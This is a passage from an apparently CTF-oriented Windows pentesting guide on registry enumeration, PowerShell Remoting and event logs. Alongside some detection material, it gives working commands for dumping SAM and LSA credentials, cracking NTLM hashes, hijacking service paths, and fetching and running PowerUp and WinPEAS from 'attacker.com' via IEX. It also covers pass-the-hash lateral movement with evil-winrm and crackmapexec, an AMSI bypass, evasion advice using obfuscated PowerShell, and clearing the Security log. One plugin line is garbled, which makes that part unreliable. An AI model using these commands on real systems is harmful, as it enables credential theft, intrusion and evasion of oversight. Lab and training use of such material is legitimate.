reg query "HKLM\SAM\SAM\Domains\Account\Users" /s
# Note: SAM hive requires SYSTEM privileges

# Security settings
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa"
```

### Offline Registry Analysis

**Extract Registry Hives**

```bash
# Copy registry hives from offline system or backup
# Location: C:\Windows\System32\config\
# Files: SAM, SECURITY, SOFTWARE, SYSTEM, DEFAULT

# Also: C:\Users\<username>\NTUSER.DAT
```

**Analyze with RegRipper**

```bash
# Install RegRipper
git clone https://github.com/keydet89/RegRipper3.0.git

# Run against specific hive
perl rip.pl -r /path/to/SOFTWARE -p software

# Common plugins:
# - soft Human: Continueware: Installed software
# - userassist: User execution history
# - recentdocs: Recently accessed files
# - sam: User account information

# Run all plugins
perl rip.pl -r /path/to/SYSTEM -a

# Generate report
perl rip.pl -r /path/to/SAM -p samparse > sam_output.txt
````

**Registry Hive Analysis with Python (python-registry)**

```python
#!/usr/bin/env python3
from Registry import Registry

# Open registry hive
reg = Registry.Registry('/path/to/SOFTWARE')

# Navigate to key
key = reg.open('Microsoft\\Windows\\CurrentVersion\\Run')

# List values
for value in key.values():
    print(f"{value.name()}: {value.value()}")

# Recursive key enumeration
def recurse_keys(key, depth=0):
    for subkey in key.subkeys():
        print("  " * depth + subkey.name())
        recurse_keys(subkey, depth + 1)

recurse_keys(reg.root())
````

**chntpw - Reset Passwords and Edit Registry**

```bash
# Mount Windows partition
mount /dev/sda1 /mnt/windows

# Navigate to config directory
cd /mnt/windows/Windows/System32/config

# Interactive mode
chntpw -i SAM

# Reset user password
chntpw -u Administrator SAM

# Edit registry
chntpw -e SYSTEM

# Inside chntpw:
# > cd ControlSet001\Services\RemoteRegistry
# > nv 1 Start  (change Start value to 2 to enable service)
```

**Dump Password Hashes from SAM**

```bash
# Using samdump2 (requires SYSTEM and SAM hives)
samdump2 SYSTEM SAM

# Output format: username:RID:LM_hash:NTLM_hash:::

# Using impacket-secretsdump
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract from live system (requires SYSTEM privileges)
impacket-secretsdump -just-dc-ntlm <domain>/username:password@<target>
```

**Crack Extracted Hashes**

```bash
# Using John the Ripper
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Using hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Format 1000 = NTLM
# Format 3000 = LM (if present)
```

### Registry Persistence Detection with Autoruns

**Sysinternals Autoruns** (Windows tool)

```cmd
# Command-line version
autorunsc.exe -a * -c -h -s -v > autoruns_output.csv

# Flags:
# -a *: All categories
# -c: CSV output
# -h: Show hashes
# -s: Verify signatures
# -v: Verbose

# Analyze output for unsigned or suspicious entries
```

**PowerShell Alternative**

```powershell
# Enumerate common autorun locations
$autorunKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $autorunKeys) {
    Write-Host "`n[+] $key"
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | Select-Object -Property * -ExcludeProperty PS*
}

# Check Winlogon
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Enumerate scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, TaskPath, State
```

### Registry-Based Privilege Escalation

**AlwaysInstallElevated**

```cmd
# Check if AlwaysInstallElevated is enabled
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated

# If both return 0x1, MSI packages install with SYSTEM privileges
```

[Inference] If AlwaysInstallElevated is set to 1 in both HKLM and HKCU, any user can create a malicious MSI package that executes with SYSTEM privileges.

**Weak Service Permissions**

```cmd
# Services with unquoted paths
reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s /f "ImagePath" | findstr /i /v "system32" | findstr /i /v """

# Check specific service
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<servicename>" /v ImagePath

# If path contains spaces and no quotes:
# C:\Program Files\Vulnerable Service\service.exe
# Windows tries: C:\Program.exe, C:\Program Files\Vulnerable.exe, then actual path
```

**Registry Key Permissions**

```cmd
# Check ACL on registry key
accesschk.exe -k HKLM\SYSTEM\CurrentControlSet\Services\<service>

# If current user has write permissions, can modify ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<service>" /v ImagePath /t REG_EXPAND_SZ /d "C:\malicious.exe" /f
```

### System Information from Registry

**Operating System Details**

```cmd
# OS version and build
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuild
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion

# Install date
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v InstallDate

# Registered owner
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner

# Computer name
reg query "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName" /v ComputerName

# System root
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v SystemRoot
```

**Hardware Information**

```cmd
# Processor information
reg query "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0"

# BIOS information
reg query "HKLM\HARDWARE\DESCRIPTION\System" /v SystemBiosVersion

# Time zone
reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"
```

### Security Settings

**LSA Secrets**

```cmd
# Requires SYSTEM privileges
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive

# Extract with impacket-secretsdump
impacket-secretsdump -security security.hive -system system.hive LOCAL

# Reveals cached domain credentials, service account passwords, etc.
```

**Audit Policy**

```cmd
# Security audit settings
reg query "HKLM\SECURITY\Policy\PolAdtEv" /s

# More readable with auditpol
auditpol /get /category:*
```

**User Rights Assignment**

```cmd
# Local Security Policy settings
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

# UAC settings
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin

# Values:
# EnableLUA: 0 = disabled, 1 = enabled
# ConsentPromptBehaviorAdmin: 0 = no prompt, 5 = prompt for non-Windows binaries
```

### Event Log Configuration

**Event Log Settings**

```cmd
# Event log configuration
reg query "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /s

# Maximum log size
reg query "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v MaxSize

# Retention policy
reg query "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v Retention
```

### Remote Registry Tools

**Impacket reg.py**

```bash
# Query remote registry
impacket-reg domain/username:password@<target> query -keyName "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Add registry key
impacket-reg domain/username:password@<target> add -keyName "HKLM\SOFTWARE\TestKey"

# Add registry value
impacket-reg domain/username:password@<target> add -keyName "HKLM\SOFTWARE\TestKey" -v TestValue -vd "Data" -vt REG_SZ

# Delete registry key
impacket-reg domain/username:password@<target> delete -keyName "HKLM\SOFTWARE\TestKey"

# Save hive remotely
impacket-reg domain/username:password@<target> save -keyName HKLM\\SAM
```

**CrackMapExec Registry Operations**

```bash
# Query registry
crackmapexec smb <target> -u username -p password --reg query -key "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -value ProductName

# Add registry value
crackmapexec smb <target> -u username -p password --reg add -key "HKLM\SOFTWARE\Test" -value TestVal -type REG_SZ -data "TestData"

# Delete registry key
crackmapexec smb <target> -u username -p password --reg delete -key "HKLM\SOFTWARE\Test"
```

### Automated Registry Enumeration Scripts

**WinPEAS Registry Checks**

```powershell
# Download and run WinPEAS
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/winPEAS.ps1')

# Checks include:
# - Autoruns
# - AlwaysInstallElevated
# - Stored credentials
# - Weak service permissions
# - LSA protection status
```

**PowerUp Registry Enumeration**

```powershell
# Import PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')

# Check for registry-based privilege escalation
Invoke-AllChecks

# Specific checks:
Get-RegistryAlwaysInstallElevated
Get-ModifiableRegistryAutoRun
Get-RegistryAutoLogon
```

**Custom PowerShell Enumeration Script**

```powershell
#!/usr/bin/env powershell
# Registry Enumeration Script

Write-Host "[+] Checking AutoRuns..." -ForegroundColor Green
$runKeys = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($key in $runKeys) {
    Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
}

Write-Host "`n[+] Checking AlwaysInstallElevated..." -ForegroundColor Green
$hklm = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$hkcu = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($hklm -eq 1 -and $hkcu -eq 1) {
    Write-Host "[!] AlwaysInstallElevated ENABLED - Privilege Escalation Possible!" -ForegroundColor Red
}

Write-Host "`n[+] Checking for Stored Credentials..." -ForegroundColor Green
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon

Write-Host "`n[+] Searching for Password Keywords..." -ForegroundColor Green
Get-ChildItem -Path HKCU:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty | Where-Object {$_.PSObject.Properties.Name -match "password|pwd"} | Select-Object -First 10
```

---

**Key Windows Enumeration Principles for CTF Success**:

1. **Service Accessibility**: WinRM and RDP often provide initial access - check for weak authentication
2. **Registry Persistence**: Most malware and persistence mechanisms leave registry artifacts
3. **Credential Storage**: Windows registry frequently contains cleartext or weakly encrypted credentials
4. **Privilege Escalation**: Registry misconfigurations (AlwaysInstallElevated, weak service permissions) are common vectors
5. **Remote Access**: Many Windows registry operations can be performed remotely with appropriate credentials

**Important Subtopics for Advanced Study**:

- **WMI Enumeration** (WMI queries for system information)
- **PowerShell Remoting** (PSRemoting security and enumeration)
- **Active Directory Enumeration** (LDAP queries, BloodHound analysis)
- **LSASS Memory Dumping** (Credential extraction from memory)
- **Token Impersonation** (SeImpersonatePrivilege exploitation)
- **Windows Event Log Analysis** (Security event correlation)
- **NTLM Relay Attacks** (SMB relay for authentication bypass)

---

## PowerShell Remoting Discovery

PowerShell Remoting (PSRemoting) uses WinRM (Windows Remote Management) for remote command execution and interactive sessions. Discovering PSRemoting capabilities reveals accessible targets for lateral movement and identifies systems with weak configurations.

### PowerShell Remoting Fundamentals

**WinRM Service Details:**

- **Default Ports**: 5985/TCP (HTTP), 5986/TCP (HTTPS)
- **Protocol**: WS-Management (Web Services for Management)
- **Authentication**: Kerberos, NTLM, CredSSP, Certificate-based
- **Requirements**: WinRM service enabled, firewall rules allowing connections, user with appropriate permissions

### Checking Local PSRemoting Status

**Verify WinRM Service**

```powershell
# Check if WinRM service is running
Get-Service WinRM

# Get detailed WinRM configuration
Get-WSManInstance -ResourceURI winrm/config -Enumerate

# Check if PSRemoting is enabled
Test-WSMan

# View listener configuration
Get-WSManInstance -ResourceURI winrm/config/listener -Enumerate

# Check enabled authentication methods
Get-Item WSMan:\localhost\Service\Auth\*

# View allowed hosts (TrustedHosts)
Get-Item WSMan:\localhost\Client\TrustedHosts
```

**Enable PSRemoting (If Disabled)**

```powershell
# Enable PSRemoting on local machine
Enable-PSRemoting -Force

# Enable with SkipNetworkProfileCheck (for public networks)
Enable-PSRemoting -SkipNetworkProfileCheck -Force

# Configure TrustedHosts (allows connection to any host - security risk)
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Add specific hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.1.10,192.168.1.11" -Force

# Quick setup for domain-joined machines
winrm quickconfig
```

### Remote PSRemoting Discovery

**Test Remote PSRemoting Availability**

```powershell
# Test single host
Test-WSMan -ComputerName 192.168.1.10

# Test with credentials
$Cred = Get-Credential
Test-WSMan -ComputerName 192.168.1.10 -Credential $Cred

# Test multiple hosts
$targets = @("192.168.1.10","192.168.1.11","192.168.1.12")
foreach ($target in $targets) {
    try {
        Test-WSMan -ComputerName $target -ErrorAction Stop
        Write-Host "[+] $target - PSRemoting Available" -ForegroundColor Green
    } catch {
        Write-Host "[-] $target - PSRemoting Unavailable" -ForegroundColor Red
    }
}

# Test from file
Get-Content targets.txt | ForEach-Object {
    if (Test-WSMan -ComputerName $_ -ErrorAction SilentlyContinue) {
        "$_ - Accessible"
    }
}
```

**Network-Level Discovery**

```bash
# Nmap scan for WinRM ports (Linux)
nmap -p 5985,5986 192.168.1.0/24 --open

# Detailed WinRM service detection
nmap -p 5985,5986 -sV 192.168.1.0/24

# NSE scripts for WinRM
nmap -p 5985 --script http-auth-finder 192.168.1.10
nmap -p 5985 --script http-methods 192.168.1.10

# CrackMapExec WinRM discovery
crackmapexec winrm 192.168.1.0/24

# Check with credentials
crackmapexec winrm 192.168.1.0/24 -u administrator -p Password123

# With hash
crackmapexec winrm 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Enumerating PSRemoting Configurations

**Session Configuration Discovery**

```powershell
# List available session configurations
Get-PSSessionConfiguration

# Detailed configuration info
Get-PSSessionConfiguration | Select-Object Name, PSVersion, Permission

# Check specific configuration
Get-PSSessionConfiguration -Name Microsoft.PowerShell | Format-List *

# Remote session configuration enumeration
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-PSSessionConfiguration
}

# Check for constrained language mode
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    $ExecutionContext.SessionState.LanguageMode
}
```

**Discover Trusted Hosts**

```powershell
# Local TrustedHosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# Remote TrustedHosts enumeration
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-Item WSMan:\localhost\Client\TrustedHosts
}

# Interpretation:
# "*" = Allows connections to any host (security risk)
# Specific IPs/hostnames = Limited trust scope
# Empty = Only allows Kerberos-authenticated connections
```

**Enumerate WinRM Listeners**

```powershell
# Local listeners
Get-ChildItem WSMan:\localhost\Listener

# Detailed listener information
Get-ChildItem WSMan:\localhost\Listener | ForEach-Object {
    Get-ChildItem "WSMan:\localhost\Listener\$($_.Name)"
}

# Remote listener enumeration
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ChildItem WSMan:\localhost\Listener | ForEach-Object {
        $_.Name
        Get-ChildItem "WSMan:\localhost\Listener\$($_.Name)"
    }
}

# Check for HTTP vs HTTPS listeners
winrm enumerate winrm/config/listener
```

### PSRemoting Connection Methods

**Interactive Remote Sessions**

```powershell
# Enter remote PowerShell session
Enter-PSSession -ComputerName 192.168.1.10 -Credential $Cred

# With specific authentication
Enter-PSSession -ComputerName 192.168.1.10 -Credential $Cred -Authentication Kerberos

# SSL connection
Enter-PSSession -ComputerName 192.168.1.10 -Credential $Cred -UseSSL

# Session with specific configuration
Enter-PSSession -ComputerName 192.168.1.10 -Credential $Cred -ConfigurationName Microsoft.PowerShell32

# Exit session
Exit-PSSession
```

**One-to-Many Command Execution**

```powershell
# Execute command on multiple hosts
Invoke-Command -ComputerName 192.168.1.10,192.168.1.11 -Credential $Cred -ScriptBlock {
    Get-Process
}

# Execute from file list
$computers = Get-Content computers.txt
Invoke-Command -ComputerName $computers -Credential $Cred -ScriptBlock {
    hostname
}

# Run local script on remote systems
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -FilePath C:\scripts\enum.ps1

# Pass arguments to remote script
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    param($arg1, $arg2)
    Write-Output "$arg1 $arg2"
} -ArgumentList "Hello", "World"
```

**Persistent Sessions**

```powershell
# Create persistent session
$Session = New-PSSession -ComputerName 192.168.1.10 -Credential $Cred

# Use session for multiple commands
Invoke-Command -Session $Session -ScriptBlock { Get-Service }
Invoke-Command -Session $Session -ScriptBlock { Get-Process }

# Copy files to/from session
Copy-Item -Path C:\local\file.txt -Destination C:\remote\file.txt -ToSession $Session
Copy-Item -Path C:\remote\data.txt -Destination C:\local\data.txt -FromSession $Session

# Disconnect session (keeps running)
Disconnect-PSSession -Session $Session

# Reconnect to session
Connect-PSSession -Session $Session

# Remove session
Remove-PSSession -Session $Session

# View all active sessions
Get-PSSession
```

### Enumeration via PowerShell Remoting

**System Information Gathering**

```powershell
# Operating system details
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture, LastBootUpTime
}

# Hardware information
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain, Manufacturer, Model, TotalPhysicalMemory
}

# Network configuration
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-NetIPConfiguration
    Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"}
}

# Installed software
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher | 
    Where-Object {$_.DisplayName -ne $null}
}

# Installed hotfixes/patches
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-HotFix | Select-Object HotFixID, Description, InstalledOn | Sort-Object InstalledOn
}
```

**User and Group Enumeration**

```powershell
# Local users
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet
}

# Local groups
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-LocalGroup
}

# Local administrators
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-LocalGroupMember -Group "Administrators"
}

# Currently logged on users
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    query user
}

# Active sessions
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance Win32_LoggedOnUser | Select-Object Antecedent -Unique
}
```

**Service and Process Enumeration**

```powershell
# Running services
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType
}

# Services running as SYSTEM
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, PathName
}

# Unquoted service paths (privilege escalation vector)
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance Win32_Service | 
    Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | 
    Select-Object Name, PathName, StartMode, State
}

# Running processes with owners
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-Process -IncludeUserName | Select-Object ProcessName, Id, UserName, Path
}
```

**Security Configuration Discovery**

```powershell
# Firewall status
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-NetFirewallProfile | Select-Object Name, Enabled
}

# Antivirus products
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
}

# Windows Defender status
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-MpComputerStatus
}

# AppLocker policies
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-AppLockerPolicy -Effective -Xml
}

# LAPS (Local Administrator Password Solution) detection
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd" -ErrorAction SilentlyContinue
}

# Audit policies
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    auditpol /get /category:*
}
```

**Scheduled Tasks Enumeration**

```powershell
# List all scheduled tasks
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ScheduledTask | Select-Object TaskName, TaskPath, State, Actions
}

# Tasks with specific triggers or actions
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM"} | 
    Select-Object TaskName, @{Name="User";Expression={$_.Principal.UserId}}
}

# Detailed task information
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo
}
```

### PSRemoting Lateral Movement Tools

**Evil-WinRM (Linux)**

```bash
# Basic connection
evil-winrm -i 192.168.1.10 -u administrator -p Password123

# With hash
evil-winrm -i 192.168.1.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# SSL connection
evil-winrm -i 192.168.1.10 -u administrator -p Password123 -S

# Load PowerShell scripts
evil-winrm -i 192.168.1.10 -u administrator -p Password123 -s /path/to/scripts

# Upload/download files
*Evil-WinRM* PS C:\> upload /local/file.txt C:\remote\file.txt
*Evil-WinRM* PS C:\> download C:\remote\data.txt /local/data.txt

# Execute local scripts
*Evil-WinRM* PS C:\> Invoke-Binary /path/to/binary.exe

# Bypass AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI
```

**CrackMapExec with PSRemoting**

```bash
# Execute commands via WinRM
crackmapexec winrm 192.168.1.10 -u administrator -p Password123 -x "whoami"

# PowerShell commands
crackmapexec winrm 192.168.1.10 -u administrator -p Password123 -X 'Get-Process'

# Execute with hash
crackmapexec winrm 192.168.1.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "ipconfig"

# Module execution
crackmapexec winrm 192.168.1.10 -u administrator -p Password123 -M mimikatz
crackmapexec winrm 192.168.1.10 -u administrator -p Password123 -M enum_chrome

# Scan subnet
crackmapexec winrm 192.168.1.0/24 -u administrator -p Password123 --sam
```

### PSRemoting Security Considerations

**Common Misconfigurations:**

- **TrustedHosts = "*"**: Allows connections to any host without proper authentication validation
- **HTTP-only listeners**: Credentials sent in cleartext over port 5985 [Unverified: depends on encryption at WinRM protocol level]
- **Weak authentication**: NTLM-only authentication vulnerable to relay attacks
- **Excessive permissions**: Non-admin users with PSRemoting access
- **No network segmentation**: PSRemoting accessible from untrusted networks

**Detection Artifacts:**

```powershell
# PSRemoting leaves specific Event IDs:
# Event ID 4624 - Logon Type 3 (Network) with WinRM
# Event ID 4648 - Explicit credential usage
# Event ID 91 - WinRM creating shell (Microsoft-Windows-WinRM/Operational)
# Event ID 169 - WinRM authenticating user

# PowerShell script block logging (Event ID 4104)
# Module logging (Event ID 4103)
```

**Evasion Considerations:**

```powershell
# Use legitimate admin accounts discovered during enumeration
# Operate during normal business hours
# Limit command execution frequency
# Use obfuscated PowerShell when possible

# Example: Obfuscated command execution
$command = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="))
Invoke-Expression $command
```

## Windows Event Log Analysis

Windows Event Logs record system activities, security events, application behaviors, and authentication attempts. Analyzing logs reveals user activity, privilege escalation attempts, lateral movement indicators, and system vulnerabilities.

### Event Log Fundamentals

**Event Log Categories:**

- **Security**: Authentication, privilege usage, object access (Event IDs 4624-4648, 4672, 4688)
- **System**: Service changes, system startups, driver failures
- **Application**: Application-specific events, crashes, installations
- **Windows PowerShell**: PowerShell script execution (Event IDs 400, 403, 4103, 4104)
- **Microsoft-Windows-Sysmon/Operational**: Sysmon events if installed (Event IDs 1-26)
- **Microsoft-Windows-WinRM/Operational**: WinRM activity (Event IDs 91, 168, 169)

### Local Event Log Access

**PowerShell Event Log Queries**

```powershell
# List available logs
Get-WinEvent -ListLog * | Select-Object LogName, RecordCount, IsEnabled

# List Security log specifically
Get-WinEvent -ListLog Security

# Read recent Security events
Get-WinEvent -LogName Security -MaxEvents 100

# Filter by Event ID
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624}

# Time-based filtering
$StartTime = (Get-Date).AddHours(-24)
Get-WinEvent -LogName Security -FilterHashtable @{StartTime=$StartTime}

# Multiple criteria
Get-WinEvent -LogName Security -FilterHashtable @{
    StartTime=(Get-Date).AddDays(-7)
    ID=4624,4625,4648
}

# Detailed event information
Get-WinEvent -LogName Security -MaxEvents 10 | Format-List *

# Export to CSV
Get-WinEvent -LogName Security -FilterHashtable @{ID=4624} | 
Select-Object TimeCreated, Id, Message | 
Export-Csv -Path events.csv -NoTypeInformation
```

**WEVTUTIL Command-Line Utility**

```powershell
# List all logs
wevtutil el

# Query log information
wevtutil gli Security

# Export log to file
wevtutil epl Security C:\export\security.evtx

# Export with filtering
wevtutil epl Security C:\export\security.evtx "/q:*[System[(EventID=4624)]]"

# Clear log (requires admin)
wevtutil cl Security

# Query events
wevtutil qe Security /c:10 /f:text

# Read specific Event ID
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text /c:5
```

**Legacy Event Viewer Commands**

```powershell
# Open Event Viewer GUI
eventvwr.msc

# Query with WMI
Get-WmiObject -Class Win32_NTLogEvent -Filter "LogFile='Security' AND EventCode=4624"

# Count events by ID
Get-EventLog -LogName Security | Group-Object EventID | Sort-Object Count -Descending
```

### Remote Event Log Access

**Remote Log Querying**

```powershell
# Remote event log access via PowerShell
$Cred = Get-Credential
Get-WinEvent -LogName Security -ComputerName 192.168.1.10 -Credential $Cred -MaxEvents 50

# Filter remote events
Get-WinEvent -ComputerName 192.168.1.10 -Credential $Cred -FilterHashtable @{
    LogName='Security'
    ID=4624
    StartTime=(Get-Date).AddHours(-24)
}

# Multiple remote systems
$computers = @("192.168.1.10","192.168.1.11")
foreach ($computer in $computers) {
    Get-WinEvent -ComputerName $computer -Credential $Cred -LogName Security -MaxEvents 10
}

# WMI remote access
Get-WmiObject -Class Win32_NTLogEvent -ComputerName 192.168.1.10 -Credential $Cred -Filter "LogFile='Security' AND EventCode=4624"

# WEVTUTIL remote query
wevtutil qe Security /r:192.168.1.10 /u:administrator /p:Password123 /f:text /c:10
```

**Remote Log Export**

```powershell
# Export remote logs
Invoke-Command -ComputerName 192.168.1.10 -Credential $Cred -ScriptBlock {
    wevtutil epl Security C:\temp\security.evtx
}

# Copy exported log
Copy-Item -FromSession $Session -Path C:\temp\security.evtx -Destination C:\local\security.evtx

# Direct export from remote system
$Session = New-PSSession -ComputerName 192.168.1.10 -Credential $Cred
Invoke-Command -Session $Session -ScriptBlock {
    Get-WinEvent -LogName Security -MaxEvents 1000 | Export-Clixml C:\temp\events.xml
}
Copy-Item -FromSession $Session -Path C:\temp\events.xml -Destination C:\local\events.xml
$events = Import-Clixml C:\local\events.xml
```

### Critical Event IDs for Enumeration

**Authentication Events (Security Log)**

**Event ID 4624 - Successful Logon**

```powershell
# Query successful logons
Get-WinEvent -LogName Security -FilterHashtable @{ID=4624} | Select-Object TimeCreated, Message

# Parse specific logon types
Get-WinEvent -LogName Security -FilterHashtable @{ID=4624} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
        LogonType = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | Select-Object -ExpandProperty '#text'
        SourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
        ProcessName = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'ProcessName'} | Select-Object -ExpandProperty '#text'
    }
}

# Logon Types:
# 2 = Interactive (local keyboard/screen)
# 3 = Network (SMB, WinRM, file shares)
# 4 = Batch (scheduled tasks)
# 5 = Service (service logons)
# 7 = Unlock (workstation unlock)
# 8 = NetworkCleartext (IIS basic auth)
# 9 = NewCredentials (RunAs with different cred)
# 10 = RemoteInteractive (RDP, Terminal Services)
# 11 = CachedInteractive (cached domain credentials)
```

**Event ID 4625 - Failed Logon**

```powershell
# Detect failed authentication attempts (password spraying/brute force)
Get-WinEvent -LogName Security -FilterHashtable @{ID=4625} | ForEach-Object {
    $xml = [xml]$_.ToXml()
    [PSCustomObject]@{
        Time = $_.TimeCreated
        User = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'TargetUserName'} | Select-Object -ExpandProperty '#text'
        FailureReason = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Status'} | Select-Object -ExpandProperty '#text'
        SourceIP = $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'IpAddress'} | Select-Object -ExpandProperty '#text'
    }
} | Group-Object User | Sort-Object Count -Descending

